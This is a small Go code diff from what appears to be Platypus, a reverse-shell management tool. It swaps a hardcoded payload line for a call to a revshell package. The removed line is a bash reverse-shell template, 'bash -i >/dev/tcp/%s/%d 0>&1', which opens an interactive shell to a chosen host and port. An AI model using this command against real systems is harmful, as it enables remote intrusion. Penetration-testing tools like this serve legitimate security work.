@@ -7,7 +7,7 @@ import (
 	"strconv"
 	"strings"
 	"time"
-
+	"github.com/WangYihang/Platypus/lib/payload/revshell"
 	"github.com/WangYihang/Platypus/lib/util/hash"
 	"github.com/WangYihang/Platypus/lib/util/log"
 	humanize "github.com/dustin/go-humanize"
@@ -133,7 +133,7 @@ func (s *TCPServer) Run() {
 					host := target[1]
 					port, err := strconv.Atoi(target[2])
 					if err == nil {
-						command = fmt.Sprintf("bash -c 'bash -i >/dev/tcp/%s/%d 0>&1'\n", host, port)
+						command = revshell.RevShell(host, port)
 					} else {
 						log.Debug("Invalid port number: %s", target[2])
 					}
